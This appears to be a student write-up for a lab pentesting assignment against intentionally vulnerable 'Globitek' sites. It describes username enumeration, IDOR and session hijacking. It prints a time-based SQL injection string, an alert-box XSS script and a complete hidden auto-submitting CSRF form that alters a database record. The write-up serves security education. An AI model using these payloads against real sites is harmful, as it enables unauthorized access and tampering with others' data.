# Project 8 - Pentesting Live Targets

Time spent: **X** hours spent in total

> Objective: Identify vulnerabilities in three different versions of the Globitek website: blue, green, and red.

The six possible exploits are:

* Username Enumeration
* Insecure Direct Object Reference (IDOR)
* SQL Injection (SQLi)
* Cross-Site Scripting (XSS)
* Cross-Site Request Forgery (CSRF)
* Session Hijacking/Fixation

Each color is vulnerable to only 2 of the 6 possible exploits. First discover which color has the specific vulnerability, then write a short description of how to exploit it, and finally demonstrate it using screenshots compiled into a GIF.

## Blue

Vulnerability #1: SQL Injection (SQLi) 

Description:

![alt text](https://github.com/ethansam911/code_path_week_9/blob/main/blue_sql_injection.gif)

  * [x]  The Attacker is Injects a sql command instead of the proper Salesperson's ID Number.
  * [x]  Injected SQL Command:
  ```html
' OR SLEEP(10)=0--'
  ```
  * [x]  This causes the Database to wait for 5 seconds while querying the data. May be longer than 5 seconds to account for request and response times.



Vulnerability #2: Session Hijacking/Fixation
![alt text](https://github.com/ethansam911/code_path_week_9/blob/main/blue_session_hijacking.gif)

  * [x]  The Victim's session ID is obtained through the tool that is provided by the codepath
  * [x]  From the intercepted session, we can modify the session ID to the one we obtained from the Victim
  * [x]  The the attacker is logged in using the Victim's session ID
(Burpsuite can be used to intercept packets - view the session ID here as well and copy it down)



## Green

Vulnerability #1: User Enumeration

Description:

 * [x]  Seen below, the Green Website has the Username Enumeration error where the failure to login message differs for the Username that exists vs doesn't exist.
  * [x]  Using firefox's debugging tool, I was able to see that the Developer assigns two different classes, failed and failure, to the error message depending on the login senerio.
  * [x]  The "failure" class is applied an bold style in css while "failed" class doesn't. (Screen shots below)

![alt text](https://github.com/ethansam911/code_path_week_9/blob/main/green_login_1.png)

![alt text](https://github.com/ethansam911/code_path_week_9/blob/main/green_login_2.png)

![alt text](https://github.com/ethansam911/code_path_week_9/blob/main/green_user_enumeration.gif)


Vulnerability #2: Cross-Site Scripting (XSS)

Description:

* [x]  Attacker can inject an XSS in their feedback form.

* [x] Injected XSS Command    

```html
<script>alert('We got in!!!!!!!!');</script>
```
* [x]  This XSS runs once the account holder checks their feedback page

![alt text](https://github.com/ethansam911/code_path_week_9/blob/main/green_xss.gif)


## Red

Vulnerability #1: Insecure Direct Object Reference

Description:


  * [x]  Below GIF show an attacker getting access to the hidden user's accounts that the attacker is not permitted to view. 
  * [x]  This is done through modifying the "id" parameter in the URL's to change the GET request.
  * [x]  Below are the accounts that the Attacker is able to access:
![alt text](https://github.com/ethansam911/code_path_week_9/blob/main/red_idor.gif)


Vulnerability #2: Cross-Site Request Forgery (CSRF)


  * [x]  Created a malicious page that utilizes the user's session to forge a request to the database:
```html
<html>
  <head>
    <title>NOT A FAKE FORM</title>
  </head>
  <body onload="document.my_form.submit()">
    <form action="https://35.184.199.7/red/public/staff/salespeople/edit.php?id=5" method="POST" name="my_form" style="display: none;" target="hidden_results" >
      <input type="text" name="first_name" value="GET REKT NOOB" />
      <input type="text" name="last_name" value="LOVE YOU BABY" />
      <input type="text" name="phone" value="777-777-7777" />
      <input type="text" name="email" value="KEKW@KEKW.COM" />
    </form>
    <iframe name="hidden_results" style="display: none;"></iframe>
  </body>
</html>
```
  * [x]  This page secretly makes a post request on page load and hides the outcome in a hidden iframe. 
  * [x]  As result, an account in the database is altered.

![alt text](https://github.com/ethansam911/code_path_week_9/blob/main/red_csrf.gif)

## Notes

Spent a lot of time trying to find the correct input boxes for the given exploitation methods. 

